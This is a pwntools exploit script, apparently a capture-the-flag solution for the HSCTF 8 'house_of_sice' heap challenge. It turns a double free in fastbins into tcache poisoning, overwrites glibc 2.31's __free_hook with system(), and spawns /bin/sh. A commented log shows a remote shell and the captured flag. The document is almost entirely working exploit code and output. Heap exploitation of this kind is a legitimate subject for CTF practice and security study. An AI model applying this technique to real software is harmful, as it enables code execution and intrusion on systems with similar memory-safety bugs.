#!/usr/bin/python3
from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './house_of_sice'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "house-of-sice.hsc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
else:
  #s = process(BINARY)
  s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  #libc = elf.libc
  libc = ELF("./libc-2.31.so")

def Purchase(kind, num):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(kind))
  s.sendlineafter("> ", str(num))

def Sell(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("> ", str(idx))

s.recvuntil("deet: 0x")
system_addr = int(s.recvuntil("\n")[:-1], 16)
libc_base   = system_addr - libc.sym.system
free_hook   = libc_base + libc.sym.__free_hook

print("system_addr =", hex(system_addr))
print("libc_base   =", hex(libc_base))

for i in range(9):
  Purchase(1, i)

# Double free in fastbins
for i in range(9):
  Sell(i)
Sell(7)

# Write __free_hook in tcache
Purchase(1, 0) #9
Purchase(1, 0) #10
Purchase(2, free_hook) #11

# Write system() in __free_hook
Purchase(1, u64("/bin/sh\x00")) #12
Purchase(1, system_addr) #13

# Start /bin/sh
Sell(12)

s.interactive()

'''
mito@ubuntu:~/CTF/HSCTF_8/Pwn_House_of_Sice$ python3 solve.py r
[*] '/home/mito/CTF/HSCTF_8/Pwn_House_of_Sice/house_of_sice'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to house-of-sice.hsc.tf on port 1337: Done
[*] '/home/mito/CTF/HSCTF_8/Pwn_House_of_Sice/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
system_addr = 0x7f56984e9410
libc_base   = 0x7f5698494000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag
flag{tfw_the_double_free_check_still_sucks}
'''

